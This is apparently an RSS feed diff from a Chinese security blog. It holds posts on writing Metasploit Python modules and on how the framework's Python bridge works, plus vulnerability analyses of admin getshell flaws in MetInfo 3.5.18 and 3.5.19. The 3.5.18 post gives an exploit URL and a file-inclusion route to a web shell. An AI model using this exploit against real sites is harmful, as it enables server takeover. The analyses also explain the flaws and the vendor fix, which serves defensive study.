+|            |  Moar status        |                   |
+|            | &lt;-------------------+                   |
+|            |                     |                   |
+|            |  I found a thing    |                   |
+|            | &lt;-------------------+                   |
+|            |                     |                   |
+|            |                     +-------------------+
+|            |
++------------+
+</code></pre>
+
+<h3 id="将会发生什么">将会发生什么</h3>
+
+<p>实际上对于原来的开发方式没有影响,完全可以使用原来的ruby编写方式.但是对于不熟悉ruby的开发者可以使用python来方便的编写模块</p>
+
+<h3 id="python在metasploit能做什么">python在metasploit能做什么</h3>
+
+<p>可以使用的和ruby模块并没有区别</p>
+
+<h2 id="如何编写一个python模块">如何编写一个python模块</h2>
+
+<p>首先需要导入需要的模块</p>
+
+<pre><code>#!/usr/bin/env python
+# another:bluebird
+from metasploit import module
+</code></pre>
+
+<p>这个metasploit实际上路径是 <code>lib/msf/core/modules/external/python/</code></p>
+
+<p>然后定义元数据 格式和ruby模块的一样.详细可参考<a href="https://www.kancloud.cn/bluebird/metasploit/486941">这里的文档</a></p>
+
+<pre><code>metadata = {
+	# 模块名字
+    'name': 'metasploit python module demo ',
+    # 模块的描述
+    'description': '''
+        send a http request metasploit python module demo
+     ''',
+     # 模块作者
+    'authors': [
+        'bluebird', 
+    ],
+    # 编写时间
+    'date': '2018-02-02',
+    # 漏洞参考
+    'references': [
+       
+     ],
+     # 漏洞类型 只能在已有的类型选项 
+    'type': 'dos',
+    # 模块选项
+    'options': {
+        'rhost': {'type': 'address', 'description': 'The target address', 'required': True, 'default': None},
+        'rport': {'type': 'port', 'description': 'The target port', 'required': True, 'default': 80},
+     }}
+</code></pre>
+
+<p>然后一般应该定义一个<code>run</code>方法.这个demo输出了helloworld</p>
+
+<pre><code>def run(args):
+    module.log('helloworld')
+   
+</code></pre>
+
+<p>最后定义主方法</p>
+
+<pre><code>if __name__ == &quot;__main__&quot;:
+    module.run(metadata, run)
+</code></pre>
+
+<p>让我们实际跑一下(注意请给你的python文件添加执行权限)</p>
+
+<pre><code>msf5 auxiliary(test/demo) &gt; set rhost 127.0.0.1
+rhost =&gt; 127.0.0.1
+msf5 auxiliary(test/demo) &gt; run
+
+[*] Starting server...
+[*] hello world
+[*] Auxiliary module execution completed
+msf5 auxiliary(test/demo) &gt; 
+</code></pre>
+]]></content></item><item><title>metasploit python 模块是如何运行</title><link>https://blue-bird1.github.io/posts/metasploit2/</link><pubDate>Fri, 02 Feb 2018 22:57:52 +0800</pubDate><guid>https://blue-bird1.github.io/posts/metasploit2/</guid><description>开始 metasploit的扩展实现的代码主要在metasploit-framework/lib/msf/core/modules/exter</description><content type="html"><![CDATA[
+
+<h2 id="开始">开始</h2>
+
+<p>metasploit的扩展实现的代码主要在<code>metasploit-framework/lib/msf/core/modules/external
+</code>
+目录结构如下</p>
+
+<pre><code>├── bridge.rb
+├── message.rb
+├── python
+│   ├── async_timeout
+│   │   ├── __init__.py
+│   └── metasploit
+│       ├── __init__.py
+│       ├── __init__.pyc
+│       ├── module.py
+│       ├── module.pyc
+│       ├── probe_scanner.py
+├── shim.rb
+└── templates
+    ├── capture_server.erb
+    ├── common_metadata.erb
+    ├── dos.erb
+    ├── multi_scanner.erb
+    └── remote_exploit_cmd_stager.erb
+
+</code></pre>
+
+<p>其中<code>python</code>目录的py代码将会在我们运行python模块时加入python路径.这也是为什么我们能导入<code>metasploit</code>
+<code>templates</code>目录则是用于实现将python代码变成模块的代码模板.事实上我们能使用msf对正常模块的功能 如<code>info</code>都是靠这些模板实现的.
+<code>message.rb</code>和<code>bridge</code>是与msf jsonrpc通信的一些api.
+<code>shim.rb</code>则是真正将python代码实现为模块的代码.</p>
+
+<p>这里省略了不重要的细节的<code>message.rb</code>代码</p>
+
+<pre><code>class Msf::Modules::External::Message
+ 
+  def self.from_module(j)                                                                                        
+    if j['method']
+      m = self.new(j['method'].to_sym)
+      m.params = j['params']
+      m
+    elsif j['response']
+      m = self.new(:reply)
+      m.params = j['response']
+      m.id = j['id']
+      m
+    end
+  end
+ 
+  def initialize(m)
+    self.method = m
+    self.params = {}
+    self.id = Base64.strict_encode64(SecureRandom.random_bytes(16))
+  end
+ 
+  def to_json
+    params =
+      if self.params.respond_to? :to_nested_values
+        self.params.to_nested_values
+      else
+        self.params.to_h
+      end
+    JSON.generate({jsonrpc: '2.0', id: self.id, method: self.method, params: params})
+  end
+
+</code></pre>
+
+<p>这个类实际上是对传递给metasploit的信息的一个封装.
+<code>initialize</code>是ruby的初始化方法 从这里可以看到它有三个属性<code>method</code> <code>params</code> <code>id</code></p>
+
+<p><code>from_module</code>方法则是用于将传递的参数转换成自身
+<code>to_json</code>方法很明显就是转换成一个可用的json(jsonrpc传递需要json格式)</p>
+
+<p>这里是省略了不重要的细节的<code>bridge.rb</code>代码</p>
+
+<pre><code>require 'msf/core/modules/external/message'
+
+class Msf::Modules::External::Bridge
+  
+  # 通过jsonrpc运行
+  def run(datastore)
+    unless self.running
+      m = Msf::Modules::External::Message.new(:run)
+      m.params = datastore.dup
+      send(m)
+      self.running = true
+    end
+  end
+	
+  # 获取当前状态和恢复run状态  
+  def get_status
+    if self.running || !self.messages.empty?
+      m = receive_notification
+      if m.nil?
+        close_ios
+        self.messages.close
+        self.running = false
+      end
+
+      return m
+    end
+  end
+  
+  # 接收
+  def recv(filter_id=nil, timeout=600)
+    _, out, err = self.ios
+    message = ''
+  
+  # jsonrpc发送和接受
+  def send_receive(message)
+    send(message)
+    recv(message.id)
+  end
+  
+  # 发送模块元数据
+  def describe
+    resp = send_receive(Msf::Modules::External::Message.new(:describe))
+    close_ios
+    resp.params
+  end
+  	
+  # 发送  
+  def send(message)
+    input, output, err, status = ::Open3.popen3(self.env, self.cmd)
+    self.ios = [input, output, err]
+    self.wait_thread = status
+    case select(nil, [input], nil, 0.1)
+    when nil
+      raise &quot;Cannot run module #{self.path}&quot;
+    when [[], [input], []]
+      m = message.to_json
+      write_message(input, m)
+    else
+      raise &quot;Error running module #{self.path}&quot;
+    end
+  end
+  
+  # TODO 这里原本有一大段关于网络接受的代码 
+
+# 每个编程语言扩展的具体实现
+class Msf::Modules::External::PyBridge &lt; Msf::Modules::External::Bridge
+ # 判断是否是py文件
+  def self.applies?(module_name)
+    module_name.match? /\.py$/
+  end
+ 
+  # 初始化 python扩展添加了额外的路径
+  def initialize(module_path)
+    super
+    pythonpath = ENV['PYTHONPATH'] || ''
+    self.env = self.env.merge({ 'PYTHONPATH' =&gt; pythonpath + File::PATH_SEPARATOR + File.expand_path('../python', __FILE__) })
+  end
+end
+
+
+class Msf::Modules::External::Bridge
+  # 载入列表 我们可以期待更多的语言可以编写msf模块 如Msf::Modules::External::JsBridge?
+  LOADERS = [
+    Msf::Modules::External::PyBridge,
+    Msf::Modules::External::Bridge
+  ]
+	
+  # 运行模块方法 让载入的bridge都判断是否是自己所属的 
+  def self.open(module_path)
+    LOADERS.each do |klass|
+      return klass.new module_path if klass.applies? module_path
+    end
+    nil
+  end
+end
+</code></pre>
+
+<p>这里是省略了不重要的细节的<code>shim.rb</code>代码</p>
+
+<pre><code>require 'msf/core/modules/external/bridge'
+
+class Msf::Modules::External::Shim
+  # 将bridge返回的数据生成一个模块
+  def self.generate(module_path)
+    mod = Msf::Modules::External::Bridge.open(module_path)
+    return '' unless mod.meta
+    # 这里根据模块元数据来选择模板 目前只有3个 元数据获取查看bridge.rb的meta方法 
+    case mod.meta['type']
+    when 'remote_exploit_cmd_stager'
+      remote_exploit_cmd_stager(mod)
+    when 'capture_server'
+      capture_server(mod)
+    when 'dos'
+      dos(mod)
+    when 'scanner.multi'
+      multi_scanner(mod)
+    else
+      # TODO have a nice load error show up in the logs
+      ''
+    end
+  end
+  
+  # 返回一个模块 erb是ruby的一个代码模板库
+  def self.render_template(name, meta = {})
+    template = File.join(File.dirname(__FILE__), 'templates', name)
+    ERB.new(File.read(template)).result(binding)
+  end
+
+  def self.common_metadata(meta = {})
+    render_template('common_metadata.erb', meta)
+  end
+  
+  # 数据转换
+  def self.mod_meta_common(mod, meta = {})
+    meta[:path]        = mod.path.dump
+    meta[:name]        = mod.meta['name'].dump
+    meta[:description] = mod.meta['description'].dump
+    meta[:authors]     = mod.meta['authors'].map(&amp;:dump).join(&quot;,\n          &quot;)
+
+    meta[:options]     = mod.meta['options'].map do |n, o|
+      &quot;Opt#{o['type'].camelize}.new(#{n.dump},
+        [#{o['required']}, #{o['description'].dump}, #{o['default'].inspect}])&quot;
+    end.join(&quot;,\n          &quot;)
+    meta
+  end
+
+ # 渲染膜拜
+  def self.dos(mod)
+    meta = mod_meta_common(mod)
+    meta[:date] = mod.meta['date'].dump
+    meta[:references] = mod.meta['references'].map do |r|
+      &quot;[#{r['type'].upcase.dump}, #{r['ref'].dump}]&quot;
+    end.join(&quot;,\n          &quot;)
+    render_template('dos.erb', meta)
+  end
+end
+
+</code></pre>
+
+<p>所以python模块的运行过程其实是这样的
+1. class Msf::Modules::External::Shim获取到了模块路径
+2. 调用Msf::Modules::External::Bridge.open
+3.  在open方法 Msf::Modules::External::PyBridge::applies判断成功(也就是确认了是python模块)
+4.  初始化一个Msf::Modules::External::PyBridge并返回
+5.  判断元数据类型 假设是dos 则调用dos方法
+6.  调用mod_meta_common方法转换元数据 渲染代码模板</p>
+
+<p>我们可以查看<code>dos.erb</code>的内容</p>
+
+<pre><code>require 'msf/core/modules/external/bridge'
+require 'msf/core/module/external'
+
+class MetasploitModule &lt; Msf::Auxiliary
+  include Msf::Module::External
+  include Msf::Auxiliary::Dos
+
+  def initialize
+    super({
+	  &lt;%= common_metadata meta %&gt;
+      'References'  =&gt;
+        [
+          &lt;%= meta[:references] %&gt;
+        ],
+      'DisclosureDate' =&gt; &lt;%= meta[:date] %&gt;,
+      })
+
+      register_options([
+        &lt;%= meta[:options] %&gt;
+      ])
+  end
+
+  def run
+    print_status(&quot;Starting server...&quot;)
+    mod = Msf::Modules::External::Bridge.open(&lt;%= meta[:path] %&gt;)
+    mod.run(datastore)
+    wait_status(mod)
+  end
+end
+</code></pre>
+
+<p>所以事实上python模块的实现就是将python代码中元数据传递到代码模板 然后实际上调用的还是ruby模板 我们的python文件路径将会出现在</p>
+
+<pre><code>mod = Msf::Modules::External::Bridge.open(&lt;%= meta[:path] %&gt;)
+mod.run(datastore)
+</code></pre>
+
+<p>最后通过<code>bridge.run</code>调用.这种扩展方法不但没有失去对ruby模块的强大支持也没丢失python的灵活性 非常好</p>
+]]></content></item><item><title>Metinfo3.5.19 getshell</title><link>https://blue-bird1.github.io/posts/metinfogetshell/</link><pubDate>Tue, 28 Nov 2017 22:26:19 +0800</pubDate><guid>https://blue-bird1.github.io/posts/metinfogetshell/</guid><description>metinfo后台getshellexp分析 漏洞版本3.5.19 漏洞文件路径/admin/app/physical/physical.php</description><content type="html"><![CDATA[
+
+<h3 id="metinfo后台getshellexp分析">metinfo后台getshellexp分析</h3>
+
+<p>漏洞版本<code>3.5.19</code>  漏洞文件路径<code>/admin/app/physical/physical.php</code>
+有趣的是<code>3.5.18</code>修复的后台getshell也是这个文件<br />
+<code>3.5.18</code>漏洞分析 <a href="https://bbs.ichunqiu.com/thread-29582-1-1.html">点我</a>
+上次分析完后顺手审计一下那个文件，发现居然还有一个getshell漏洞。提交后没人理就发出来分享</p>
+
+<h4 id="漏洞代码">漏洞代码</h4>
+
+<pre><code>elseif($action==&quot;op&quot;){
+	// 不相关代码
+	$val=explode('|',$valphy);
+    // 不相关代码
+	switch($op){
+	   // 不相关代码
+		case 3:
+			$fileaddr=explode('/',$val[1]);
+			$filedir=&quot;../../../&quot;.$fileaddr[0];  
+			if(!file_exists($filedir)){ @mkdir ($filedir, 0777); } 
+			if($fileaddr[1]==&quot;index.php&quot;){
+				if($val[2]){
+					Copyindx(&quot;../../../&quot;.$val[1],$val[2]);
+				}
+</code></pre>
+
+<p>需要<code>op</code>参数为3才能进入漏洞代码流程，并且要正常执行，需要<code>fileaddr[1]='index.php'</code>和<code>$val[2]</code>也就是valphy参数要为<code>xxx|xxx/index.php|xxx</code>格式</p>
+
+<p>查看<code>Copyindex</code>函数</p>
+
+<pre><code>function Copyindx($newindx,$type){
+    if(!file_exists($newindx)){
+        if($type==3){
+            //生成产品栏目index
+            $oldcont =&quot;&lt;?php\n# MetInfo Enterprise Content Management System \n# Copyright (C) MetInfo Co.,Ltd (http://www.metinfo.cn). All rights reserved. \n\$filpy = basename(dirname(__FILE__));\n\$fmodule=$type;\n\$cmodule='product_index';\nrequire_once '../include/module.php'; \nrequire_once \$module; \n# This program is an open source system, commercial use, please consciously to purchase commercial license.\n# Copyright (C) MetInfo Co., Ltd. (http://www.metinfo.cn). All rights reserved.\n?&gt;&quot;;
+        }else{
+            $oldcont =&quot;&lt;?php\n# MetInfo Enterprise Content Management System \n# Copyright (C) MetInfo Co.,Ltd (http://www.metinfo.cn). All rights reserved. \n\$filpy = basename(dirname(__FILE__));\n\$fmodule=$type;\nrequire_once '../include/module.php'; \nrequire_once \$module; \n# This program is an open source system, commercial use, please consciously to purchase commercial license.\n# Copyright (C) MetInfo Co., Ltd. (http://www.metinfo.cn). All rights reserved.\n?&gt;&quot;;
+        }
+        $fp = fopen($newindx,w);
+        fputs($fp, $oldcont);
+        fclose($fp);
+    }
+}
+</code></pre>
+
+<p>可以看到如果传入type参数不等于3,进入第二个流程.发现是单纯的字符串拼接,然后这个函数的参数我们都可控</p>
+]]></content></item><item><title>metinfo3.5.18后台getshell分析</title><link>https://blue-bird1.github.io/posts/metinfoexp/</link><pubDate>Sat, 25 Nov 2017 22:26:31 +0800</pubDate><guid>https://blue-bird1.github.io/posts/metinfoexp/</guid><description>此漏洞已经在最新版修复 exp /admin/app/physical/physical.php?action=op&amp;amp;op=3&amp;amp;va</description><content type="html"><![CDATA[
+
+<p>此漏洞已经在最新版修复</p>
+
+<h3 id="exp">exp</h3>
+
+<p><code>/admin/app/physical/physical.php?action=op&amp;op=3&amp;valphy=test|文件名&amp;address=包含文件</code></p>
+
+<h3 id="代码分析">代码分析</h3>
+
+<p>查看关键代码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php">case 3:
+			$fileaddr=explode(&#39;/&#39;,$val[1]);
+			$filedir=&#34;../../../&#34;.$fileaddr[0];  
+			if(!file_exists($filedir)){ @mkdir ($filedir, 0777); } 
+			if($fileaddr[1]==&#34;index.php&#34;){
+				if($val[2]){
+					Copyindx(&#34;../../../&#34;.$val[1],$val[2]);
+				}
+			}else{
+			// 漏洞点
+			switch($val[2]){
+				case 1:
+					$address=&#34;../about/$fileaddr[1]&#34;;
+				break;
+				case 2:
+					$address=&#34;../news/$fileaddr[1]&#34;;
+				break;
+				case 3:
+					$address=&#34;../product/$fileaddr[1]&#34;;
+				break;
+				case 4:
+					$address=&#34;../download/$fileaddr[1]&#34;;
+				break;
+				case 5:
+					$address=&#34;../img/$fileaddr[1]&#34;;
+				break;
+				case 8:
+					$address=&#34;../feedback/$fileaddr[1]&#34;;
+				break;
+			
+
+			}   
+				$newfile  =&#34;../../../$val[1]&#34;; 
+				
+				Copyfile($address,$newfile);
+				
+			}
+			echo $lang_physicalgenok;
+			break;</code></pre></td></tr></table>
+</div>
+</div>
+<p>我们可以看到我们可控参数<code>$address</code>和<code>newfile</code>传入了<code>Copyfile</code>
+主要是程序员写代码的时候忽略了异常参数导致address参数没有被覆盖,应该添加不是正常参数时不执行<code>Copyfile</code></p>
+
+<p>查看<code>Copyfile</code>函数</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php">function Copyfile($address,$newfile){
+	$oldcont  = &#34;<span class="cp">&lt;?php</span><span class="nx">\n</span><span class="c1"># MetInfo Enterprise Content Management System \n# Copyright (C) MetInfo Co.,Ltd (http://www.metinfo.cn). All rights reserved. \nrequire_once &#39;$address&#39;;\n# This program is an open source system, commercial use, please consciously to purchase commercial license.\n# Copyright (C) MetInfo Co., Ltd. (http://www.metinfo.cn). All rights reserved.\n?&gt;&#34;;
+</span><span class="c1"></span>	<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$newfile</span><span class="p">)){</span>
+		<span class="nv">$fp</span> <span class="o">=</span> <span class="nx">fopen</span><span class="p">(</span><span class="nv">$newfile</span><span class="p">,</span><span class="nx">w</span><span class="p">);</span>
+		<span class="nx">fputs</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="nv">$oldcont</span><span class="p">);</span>
+		<span class="nx">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div>
+<p>此函数可以创建并写入文件
+可以看到此函数我们可以控制文件名,不过单引号导致我们只能控制require_once参数.
+不过也造成了文件包含漏洞,上传一个php代码头像,即可getshell</p>
+
+<p>查看最新版本修复方法</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php">	default:
+		 $address = &#34;&#34;;
+	break;</code></pre></td></tr></table>
+</div>
+</div>
+<p>添加了不是正常参数时候默认为空</p>
+]]></content></item></channel></rss>
